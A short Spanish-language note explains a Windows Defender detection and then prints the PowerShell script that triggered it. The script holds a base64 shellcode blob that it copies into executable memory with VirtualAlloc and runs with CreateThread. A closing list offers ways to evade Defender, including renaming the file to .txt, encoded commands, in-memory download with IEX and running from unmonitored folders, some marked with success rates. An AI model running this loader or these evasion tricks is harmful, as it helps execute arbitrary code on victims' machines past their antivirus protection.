# Windows Defender Real-time Protection + Cloud-delivered protection

Ese mensaje aparece antes de que PowerShell siquiera cargue el script, y lo genera Windows Defender Real-time Protection + Cloud-delivered protection (o alguna regla ASR) cuando:

- El archivo .ps1 coincide con una firma estática conocida
- El archivo fue descargado de Internet y tiene Mark-of-the-Web (MOTW)
- El hash o parte del contenido está en la nube de Microsoft como “PUA” o “Trojan:Script/Wacatac”

![alt text](image.png)

En este caso: 

``` powershell
$base64 = "VUiJ5UiD7Ci5jv4fS+gaAQAASIlF+EiLTfi6BoDoyOiXAAAASIlF8EiLTfi672LAH+iFAAAASIlF6EiNDUABAABIi33wSIPsKP/XSIPEKEiJReBIi03gSI0VLgEAAEiLfehIg+wo/9dIg8QoSIlF2EgxyUiNFQcBAABMjQULAQAARTHJSIPsKP/QSIPEKMNIMcBEigFBgPgAdB9BgPhBcgpBgPhadwRBgMggwcAHTQ+2wEwxwEgB0evYw4txPEiNNDGLtogAAABIjTQxi34gjTw5RItOJEaNDAlEiwdOjQQBV1FSVkyJwboBAAAA6J3///9eWllfSDnQdApIg8cESYPBAnXVZkWLSQJJgeH/DwAATWvJBEmD6QREi1YcTQHKTo0UEUWLEkqNBBHDZUiLPCVgAAAASIt/GEiLfxBIif5Mi0ZgQVBXVlFMicG6AgAAAOg5////WV5fQVhIOch0CEiLNkg5/nXYSItGMMOO/h9LBoDoyO9iwB8wgQV46YtMDHVzZXIzMi5kbGwATWVzc2FnZUJveEEA"
$bytes = [Convert]::FromBase64String($base64)

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K32 {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint t);
}
"@

$addr = [K32]::VirtualAlloc(0, $bytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
$th = [K32]::CreateThread(0,0,$addr,0,0,0)
[K32]::WaitForSingleObject($th, 0xFFFFFFFF)
```

## Soluciones

1. Ejecutar el contenido como texto plano (.txt) + IEX
2. EncodedCommand (base64 unicodean)
3. Descarga en memoria + IEX
4. Renombrar a .txt → copy → rename .ps1,90 %,Truco clásico que sigue funcionando
5. Ejecutar desde carpeta no monitorizada + IEX,"%TEMP%, %APPDATA%, Public, etc."
6. "PowerShell -Command ""IEX (gc .\x64.ps1)""",70 %,"A veces pasa, a veces no"